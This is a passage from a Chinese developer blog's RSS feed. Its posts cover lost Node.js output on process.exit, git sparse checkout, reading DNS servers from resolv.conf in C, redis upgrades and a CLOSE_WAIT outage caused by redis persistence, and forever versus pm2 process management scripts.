<a href="https://github.com/davepacheco/node-verror">node-verror</a> 支持扩展的讨论</p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[process.exit导致的控制台输出不全]]></title>
            <link>/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html</link>
            <guid>/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html</guid>
            <pubDate>Thu, 27 Aug 2015 09:03:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org6b0683c" class="outline-2">
<h2 id="org6b0683c">案例程序</h2>
<div class="outline-text-2" id="text-org6b0683c">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">i</span> = 0; i &lt; 10000; ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">"this is long long long long long long long long long long long </span><span style="color: #8abeb7; text-decoration: underline;">long long long long long long long long long long long long long long long long long long log "</span><span style="text-decoration: underline;"> + i);</span>
}
process.exit(0);
</pre>
</div>

<p>
这个程序输出 10000 行日志，然后结束进程。
</p>

<ul class="org-ul">
<li><p>
<code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 下运行
</p>

<p>
省略中间部分输出
</p>

<pre class="example">
$ node /home/tangxinfa/Examples/test_exit.js
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0
...
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 119
$ 
</pre>

<p>
程序只输出了前面 200 行日志。
</p></li>

<li><p>
按 <code>Ctrl+Alt+F2</code> 进入 2 号系统终端下运行
</p>

<p>
省略中间部分输出
</p>

<pre class="example">
$ node /home/tangxinfa/Examples/test_exit.js
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0
...
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999
$ 
</pre>

<p>
程序输出了全部日志。
</p></li>

<li><p>
<code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 下运行时将日志重定向到文件
</p>

<p>
省略中间部分输出
</p>

<pre class="example">
$ node /home/tangxinfa/Examples/test_exit.js &gt; /tmp/test_exit.log
$ tail -1 /tmp/test_exit.log
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999
$ 
</pre>

<p>
程序输出了全部日志。
</p></li>

<li><p>
原因
</p>

<p>
引用自 <a href="http://stackoverflow.com/questions/18748164/process-exit0-output-disappears">process.exit(0): output disappears?</a>
</p>
<blockquote>
<p>
当输出目标为终端或文件时，console 函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。
</p>

<p>
The console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).
</p>
</blockquote>
<p>
上面这段描述来自 <a href="https://nodejs.org/dist/latest-v0.12.x/docs/api/console.html">Node.js V0.12 官方文档</a>。
</p>

<p>
<code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 并非真正的终端，所以会丢消息。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgc390211" class="outline-2">
<h2 id="orgc390211">解决方案</h2>
<div class="outline-text-2" id="text-orgc390211">
<p>
主要解决问题的思路是要确保调用 process.exit 时标准输出及错误输出中的日志输出完毕。
</p>

<ul class="org-ul">
<li><p>
通过关闭流确保流输出完毕然后再退出
</p>

<p>
process.stdout 及 process.stderr 是 <a href="https://nodejs.org/dist/latest-v6.x/docs/api/stream.html">Writable</a> 流，通过关闭流确保流输出完毕然后再退出
</p>
<div class="org-src-container">
<pre class="src src-js">process.stderr.end(<span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(1);
});
</pre>
</div>

<p>
运行以上码会出错
</p>
<pre class="example">
events.js:141
      throw er; // Unhandled 'error' event
      ^

Error: process.stderr cannot be closed.
    at WriteStream.stderr.destroy.stderr.destroySoon (node.js:649:20)
    at WriteStream.onSocketFinish (net.js:202:17)
    at emitNone (events.js:67:13)
    at WriteStream.emit (events.js:166:7)
    at finishMaybe (_stream_writable.js:478:14)
    at endWritable (_stream_writable.js:488:3)
    at WriteStream.Writable.end (_stream_writable.js:453:5)
    at WriteStream.Socket.end (net.js:406:31)
    at Object.&lt;anonymous&gt; (/home/tangxinfa/Examples/flush_on_exit.js:1:78)
    at Module._compile (module.js:409:26)
</pre>

<p>
这是因为 process.stdout 及 process.stderr 比较特殊，不可关闭且无 finish 事件，引用自 <a href="https://nodejs.org/dist/latest-v6.x/docs/api/process.html#process_process_stderr">process.error 官方文档</a>
</p>
<blockquote>
<p>
The process.stderr property returns a Writable stream equivalent to or associated with stderr (fd 2).
</p>

<p>
Note: process.stderr and process.stdout differ from other Node.js streams in several ways:
</p>

<ol class="org-ol">
<li>They cannot be closed (end() will throw).</li>

<li>They never emit the 'finish' event.</li>

<li><p>
Writes can block when output is redirected to a file.
</p>

<p>
Note that disks are fast and operating systems normally employ write-back caching so this is very uncommon.
</p></li>

<li>Writes on UNIX will block by default if output is going to a TTY (a terminal).</li>

<li>Windows functionality differs. Writes block except when output is going to a TTY.</li>
</ol>
</blockquote></li>

<li><p>
在 write 的回调函数中退出
</p>

<p>
<code>writable.write</code> 的 <code>callback</code> 在数据写成功后调用，此时退出可以保证日志消息不丢失。
</p>

<div class="org-src-container">
<pre class="src src-js"><span class="linenr">1: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span> process.stdout.write(<span style="color: #8abeb7;">''</span>, <span style="color: #b5bd68;">function</span> () {
<span id="coderef-stderr-write" class="coderef-off"><span class="linenr">2: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stderr.write(<span style="color: #8abeb7;">''</span>, <span style="color: #b5bd68;">function</span> () {</span>
<span class="linenr">3: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(1);
<span class="linenr">4: </span><span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span class="linenr">5: </span>});
</pre>
</div>

<p>
需要注意的是，此时的写日志后进程退出是异步的，进程退出前系统可能会在异常状态下运行一小段时间。
</p>

<p>
早期的 <a href="https://github.com/Unitech/pm2">pm2</a> 版本运行 node.js 应用时，由于它会通过重写 <code>process.stdout.write</code> 和 <code>process.stderr.write</code> 方法，接管标准输出和错误输出，改写后的函数无返回值并忽略传入的回调函数（见 <a href="https://github.com/Unitech/pm2/issues/2011">node.js's process.stderr.write or process.stdout.write behavier changed by pm2 #2011</a>），导致进程不退出。可针对 <a href="https://github.com/Unitech/pm2">pm2</a> 做特殊处理，使用 pm2 后日志还是会有丢失。
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">typeof</span>(process.env.pm_id) == <span style="color: #8abeb7;">'undefined'</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stdout.write(<span style="color: #8abeb7;">''</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.stderr.write(<span style="color: #8abeb7;">''</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(1);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
} <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(1);
}
</pre>
</div></li>

<li><p>
使用 fs.writeSync
</p>

<p>
在查阅最新的 node.js 官方文档时，惊喜地发现以下<a href="https://nodejs.org/dist/latest-v6.x/docs/api/process.html#process_event_uncaughtexception">代码片段</a>
</p>
<div class="org-src-container">
<pre class="src src-js">process.on(<span style="color: #8abeb7;">'uncaughtException'</span>, (err) =&gt; {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> fs.writeSync(1, <span style="color: #8abeb7;">`Caught exception: ${err}`</span>);
});
</pre>
</div>

<p>
使用 fs.writeSync 同步输出日志后再退出进程
</p>
<div class="org-src-container">
<pre class="src src-js">process.on(<span style="color: #8abeb7;">'uncaughtException'</span>, (err) =&gt; {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   fs.writeSync(1, <span style="color: #8abeb7;">`Caught exception: ${err}`</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(1);
});
</pre>
</div>

<p>
process.stdout 和 process.stderr 流中滞留的数据没有机会输出，进程就退出了，只能保证使用 fs.writeSync 进行输出的日志不丢失，用来日志记录 uncaughtException 还是很合适的，使用 pm2 时，上面的代码会将异常日志写到 <i>root</i>.pm2/pm2.log，可以考虑改用 fs.appendFileSync 将异常日志写到应用的日志文件中。
</p>

<div class="org-src-container">
<pre class="src src-js">process.on(<span style="color: #8abeb7;">'uncaughtException'</span>, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">e</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   fs.appendFileSync(<span style="color: #8abeb7;">'/root/.pm2/app.log'</span>, e.stack);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   process.exit(1);
});
</pre>
</div>

<p>
但要注意的是，服务往往为了安全起见切换（setuid、setgid）到非特权帐号，可能没有权限写 pm2 为应用创建的日志文件。</p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[拉取git仓库的子目录]]></title>
            <link>/article/62c953d6-git-4ed35e9376845b5076ee5f55.html</link>
            <guid>/article/62c953d6-git-4ed35e9376845b5076ee5f55.html</guid>
            <pubDate>Wed, 26 Aug 2015 10:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
我们的git仓库目录结构：
</p>

<pre class="example">
http://server/company.git +
                          |
                          +- project1
                          |
                          +- project2
                          |
                          +- project3
                          |
                          +- ...
</pre>

<p>
以前使用svn的时候是可以直接拉取其中一个子项目，像下面这样：
</p>

<div class="org-src-container">
<pre class="src src-sh">svn checkout http://server/company.git/project1
</pre>
</div>

<p>
但是git好像不支持这种用法，网上找了一下相关资料，可以借助git的 <code>Sparse checkout</code> 实现：
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone http://server/company.git --no-checkout
<span style="color: #b294bb;">cd</span> company
git config core.sparsecheckout true
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"project1/"</span> &gt; .git/info/sparse-checkout
git checkout --
<span style="color: #b294bb;">cd</span> ..
ln -s company/project1 ./
</pre>
</div>

<ul class="org-ul">
<li><p>
参考
</p>

<p>
《<a href="http://stackoverflow.com/questions/4114887/is-it-possible-to-do-a-sparse-checkout-without-checking-out-the-whole-repository">Is it possible to do a sparse checkout without checking out the whole repository first?</a>》</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下编程获取/etc/resolv.conf中的域名解析服务器]]></title>
            <link>/article/linux-4e0b7f167a0b83b753d6-etc-resolv.conf-4e2d768457df540d89e36790670d52a15668.html</link>
            <guid>/article/linux-4e0b7f167a0b83b753d6-etc-resolv.conf-4e2d768457df540d89e36790670d52a15668.html</guid>
            <pubDate>Fri, 14 Aug 2015 10:01:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
直接上代码吧：
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;unistd.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;sys/types.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;netinet/in.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;arpa/inet.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;arpa/nameser.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;resolv.h&gt;</span>

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">__res_state</span> <span style="color: #f0c674;">res</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> res.options &amp;= ~ RES_INIT;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">err</span> = res_ninit(&amp;res);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"res_init error: %d\n"</span>, err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span> <span style="color: #f0c674;">ip</span>[16];
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">for</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">i</span> = 0 ; i &lt; res.nscount; ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ip[0] = <span style="color: #8abeb7;">'\0'</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span> inet_ntop(AF_INET, &amp;res.nsaddr_list[i].sin_addr, ip, <span style="color: #b5bd68;">sizeof</span>(ip))) <span style="text-decoration: underline;">{</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> perror(<span style="color: #8abeb7;">"inet_ntop"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">continue</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"ip: %s\n"</span>, ip);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> res_nclose(&amp;res);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<ul class="org-ul">
<li><p>
参考
</p>

<p>
《<a href="http://stackoverflow.com/questions/2916675/programmatically-obtain-dns-servers-of-host">Programmatically obtain DNS servers of host</a>》</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[升级redis到最新版本的过程]]></title>
            <link>/article/53477ea7-redis-5230670065b07248672c76848fc77a0b.html</link>
            <guid>/article/53477ea7-redis-5230670065b07248672c76848fc77a0b.html</guid>
            <pubDate>Mon, 10 Aug 2015 09:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
编译最新版本的redis，暂不要安装
</p>

<p>
参见《<a href="http:7f168bd15b8988c5-redis.html">编译安装redis</a>》
</p></li>

<li><p>
将旧版的redis.conf配置文件中的配置项合入新版本redis.conf
</p>

<p>
可能需要提前确认一下新版本redis是否兼容旧版本数据文件。
</p></li>

<li>卸载并停止旧版本redis</li>

<li><p>
安装新版本redis
</p>

<p>
参见《<a href="http:7f168bd15b8988c5-redis.html">编译安装redis</a>》
</p></li>

<li>启动新版本redis</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux服务器出现大量CLOSE_WAIT状态的连接]]></title>
            <link>/article/linux-670d52a1566851fa73b0592791cf-close_wait-72b6600176848fde63a5.html</link>
            <guid>/article/linux-670d52a1566851fa73b0592791cf-close_wait-72b6600176848fde63a5.html</guid>
            <pubDate>Sat, 01 Aug 2015 19:21:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
昨天服务器停止服务，node.js进程耗光了服务器的内存及CPU，node.js进程卡死无法被 <code>kill</code> 掉，最后要来root帐号密码，直接 <code>kill -9</code> 才结束掉进程。
</p>

<p>
再次鄙视一下 <a href="https://github.com/nodejitsu/forever">forever</a> ，杀不掉原来的 node.js 进程组也就罢了，竟然又拉起了一套新的 node.js 进程组。
</p>

<p>
统计了一下 <code>10</code> 万个fd都耗光了，其中 <code>9</code> 万多个为 <code>CLOSE_WAIT</code> 状态，此时服务器已经无法响应请求。
</p>

<div id="outline-container-org56b8073" class="outline-2">
<h2 id="org56b8073">CLOSE_WAIT 状态介绍</h2>
<div class="outline-text-2" id="text-org56b8073">
<p>
先看一副TCP连接关闭的状态图（ <a href="http://intronetworks.cs.luc.edu/current/html/tcp.html#index-29">来源</a> ）：
</p>


<div class="figure">
<p><img src="../static/tcp_normal_close.png" alt="tcp_normal_close.png" />
</p>
</div>

<p>
被动关闭一方才会出现 <code>CLOSE_WAIT</code> 状态，由于被动关闭方未调用 <code>close</code> 关闭socket导致，问题肯定是由服务器代码引起。
</p>

<p>
检测到对端socket关闭然后关闭本端socket是由 node.js 自行完成的，最大的可能是没有机会执行 <code>close</code> 。
</p>

<p>
我们的应用客户端与服务器有一个tls长连接，当连接断开时客户端会等待3-10秒后尝试重连服务器，如果服务器出现卡顿会导致客户端频繁重连，
</p>

<p>
如果服务器来不及关闭这些连接，则会出现 CLOSE_WAIT 状态的连接，占用大量文件描述符，减少 CLOSE_WAIT 超时时间能够在一定程度上缓解这个问题，
</p>

<p>
但是对于我们这种长连接的环境，大量CLOSE_WAIT是问题的表象，而非根源。
</p>

<p>
参考：《<a href="http://lvxuehu.iteye.com/blog/452487">解决CLOSE_WAIT 问题</a>》
</p>
</div>
</div>

<div id="outline-container-orgf9fe3d0" class="outline-2">
<h2 id="orgf9fe3d0">内存及CPU占用彪升问题</h2>
<div class="outline-text-2" id="text-orgf9fe3d0">
<p>
伴随着 CLOSE_WAIT 出现的状况是 node.js 进程内存及CPU占用超高，单node.js进程内存占用达到 1.5G，CPU占用 90% 以上，此时应该会导致 node.js 响应慢，
来不及关闭连上来的socket。
</p>

<p>
所以解决问题的关键就是：找出什么原因导致 node.js 内存及CPU 100%占用。
</p>

<p>
想到的可能是redis负载过高引起，从运维监控图上可以看出一些蹊跷，node.js出问题时redis的连接数也同样彪升，而出问题的机器上刚好就是跑redis的机器，
另一台服务器一直相安无事，没有跑redis。
</p>
</div>
</div>

<div id="outline-container-org8c67138" class="outline-2">
<h2 id="org8c67138">一次午夜故障元凶浮出水面</h2>
<div class="outline-text-2" id="text-org8c67138">
<p>
在晚上两点的时候服务出现问题，同样的现象，特别留意了一下redis的统计，请求速度很低，只有1200，平时都是5000。偶然在进程列表中发现了 redis-rdb-bgsave 的身影，
不断地执行ps看进程列表，发现 redis-rdb-bgsave 进程不断地出现，查看redis的持久化配置如下：
</p>

<pre class="example">
save 900 1
save 300 10
save 60 10000
</pre>

<p>
我们的系统有大量的redis，1分钟肯定过万，这样redis持久化变是常态了，而且由于用的是机械硬盘，持久化肯定会引起系统卡顿，先将它调整为15分钟最多持久化一次：
</p>

<pre class="example">
config set save "900 1"
</pre>

<p>
重启程序释放资源后系统开始正常响应，但是10多分钟后系统再次无响应，才想起一则经验教训：
</p>

<pre class="example">
     跑redis的机器至少要预留和redis占用内存同样大小的空闲内存空间，redis RDB持久化进行fork时最坏会占用双倍内存，内存不足就会动用交换分区，系统性能急剧下降。
</pre>

<p>
于是，立即改配置将redis所在机器上的node.js cluster进程数调小，腾出大把内存，总算没有再出现问题，今晚终于可以入眠。
</p>
</div>
</div>

<div id="outline-container-orgae46a30" class="outline-2">
<h2 id="orgae46a30">更多疑问</h2>
<div class="outline-text-2" id="text-orgae46a30">
<ul class="org-ul">
<li>我们的node.js进程为什么常常会占用很多内存？</li>

<li>netstat中看到CLOSE_WAIT状态的连接输入缓冲往往有数据，而ESTABLISHED状态的连接读写缓冲区往往为空，为什么？</li>

<li>node.js卡顿时forever杀不死反而启动了新实例帮倒忙，pm2就一定能够解决吗？</li>

<li>redis持久化引起服务挂掉，已经是在第二个项目中遇到了，终极解决方案是什么？</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[后台服务监护工具：forever与pm2]]></title>
            <link>/article/540e53f0670d52a176d162a45de55177ff1a-forever-4e0e-pm2.html</link>
            <guid>/article/540e53f0670d52a176d162a45de55177ff1a-forever-4e0e-pm2.html</guid>
            <pubDate>Fri, 24 Jul 2015 16:15:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
使用后台服务监护工具有很多好处：
</p>

<ul class="org-ul">
<li>程序崩溃时自动拉起</li>

<li>程序日志聚合（你的系统有多个模块或多个进程的时候很有必要）</li>

<li>代码更新时自动重启服务</li>
</ul>

<p>
node.js下最常用的后台服务监护工具有：<a href="https://github.com/nodejitsu/forever">forever</a> 、<a href="https://github.com/Unitech/pm2">pm2</a> 。
</p>

<p>
<a href="https://github.com/nodejitsu/forever">forever</a> 先出现，<a href="https://github.com/Unitech/pm2">pm2</a> 后出现功能更丰富，下面是特性对比：
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Feature</th>
<th scope="col" class="org-left">Forever</th>
<th scope="col" class="org-left">PM2</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Keep Alive</td>
<td class="org-left">✔</td>
<td class="org-left">✔</td>
</tr>

<tr>
<td class="org-left">Coffeescript</td>
<td class="org-left">✔</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Log aggregation</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">✔</td>
</tr>

<tr>
<td class="org-left">API</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">✔</td>
</tr>

<tr>
<td class="org-left">Terminal monitoring</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">✔</td>
</tr>

<tr>
<td class="org-left">Clustering</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">✔</td>
</tr>

<tr>
<td class="org-left">JSON configuration</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">✔</td>
</tr>
</tbody>
</table>

<p>
我在3个项目中使用 <a href="https://github.com/nodejitsu/forever">forever</a> ，多次重启出错后，决定转向 <a href="https://github.com/Unitech/pm2">pm2</a> ，目前我已经在两个较小的项目中成功使用 <a href="https://github.com/Unitech/pm2">pm2</a> 。
</p>

<div id="outline-container-orgb6b2b64" class="outline-2">
<h2 id="orgb6b2b64"><a href="https://github.com/nodejitsu/forever">forever</a></h2>
<div class="outline-text-2" id="text-orgb6b2b64">
<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-js">npm install -g forever
</pre>
</div></li>

<li><p>
配置
</p>

<p>
启动脚本
<code>start.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/forever/bi<span style="text-decoration: underline;">n:/usr/local/node/bin</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_ENV</span>=${<span style="color: #f0c674;">NODE_ENV</span>:-production}
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_CONFIG_DIR</span>=<span style="color: #b294bb;">`pwd`</span>/config

<span style="color: #f0c674;">SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js
<span style="color: #f0c674;">LOGFILE</span>=<span style="color: #b294bb;">`pwd`</span>/run.log

<span style="color: #f0c674;">running</span>=<span style="color: #b294bb;">`forever list | grep "$SCRIPT" | grep -v grep | wc -l`</span>

<span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">running</span> -lt 1 ]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   forever start --spinSleepTime=10000 --killSignal=SIGINT --pidFile=<span style="color: #b294bb;">`pwd`</span>/run.<span style="text-decoration: underline;">pid -l $</span><span style="color: #f0c674; text-decoration: underline;">LOGFILE</span><span style="text-decoration: underline;"> -a -w --watchDirectory=</span><span style="color: #b294bb; text-decoration: underline;">`pwd`</span><span style="text-decoration: underline;">/src --watchIgnore=</span><span style="color: #8abeb7; text-decoration: underline;">".svn/*"</span><span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">"$SCRIPT"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> -e <span style="color: #8abeb7;">"\nRunning."</span>
<span style="color: #b5bd68;">else</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> -e <span style="color: #8abeb7;">"\nAlready running."</span>
<span style="color: #b5bd68;">fi</span>

forever list | grep <span style="color: #8abeb7;">"$SCRIPT"</span>
</pre>
</div>

<p>
停止脚本
<code>stop.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/forever/bi<span style="text-decoration: underline;">n:/usr/local/node/bin</span>

<span style="color: #f0c674;">SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js

forever stop <span style="color: #8abeb7;">"$SCRIPT"</span>
</pre>
</div>

<p>
重启脚本     
<code>restart.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/forever/bi<span style="text-decoration: underline;">n:/usr/local/node/bin</span>

<span style="color: #f0c674;">SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js

forever restart <span style="color: #8abeb7;">"$SCRIPT"</span> || ./start.sh
</pre>
</div></li>

<li><p>
用法
</p>

<p>
启动
</p>

<div class="org-src-container">
<pre class="src src-sh">./start.sh
</pre>
</div>

<p>
停止
</p>

<div class="org-src-container">
<pre class="src src-sh">./stop.sh
</pre>
</div>

<p>
重启
</p>

<div class="org-src-container">
<pre class="src src-sh">./restart.sh
</pre>
</div></li>

<li>缺点

<ul class="org-ul">
<li><p>
程序退出过程中的日志无法捕获
</p>

<p>
参见：<a href="https://github.com/foreverjs/forever/issues/385#issuecomment-115163346">no logging after graceful shutdown #385</a>
</p>

<p>
应该是forever通过信号通知程序退出后，不再捕获程序的日志输出，程序退出的这段时间内日志丢失。
</p>

<p>
